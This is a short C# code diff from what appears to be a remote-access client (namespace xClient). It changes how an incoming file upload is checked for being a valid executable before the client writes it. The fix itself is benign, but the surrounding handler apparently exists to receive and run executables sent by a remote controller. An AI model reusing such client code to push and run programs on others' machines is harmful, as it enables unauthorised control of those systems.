@@ -75,7 +75,7 @@ namespace xClient.Core.Commands
 
             try
             {
-                if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
+                if (command.CurrentBlock == 0 && Path.GetExtension(command.FileName) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                     throw new Exception("No executable file");
 
                 FileSplit destFile = new FileSplit(filePath);
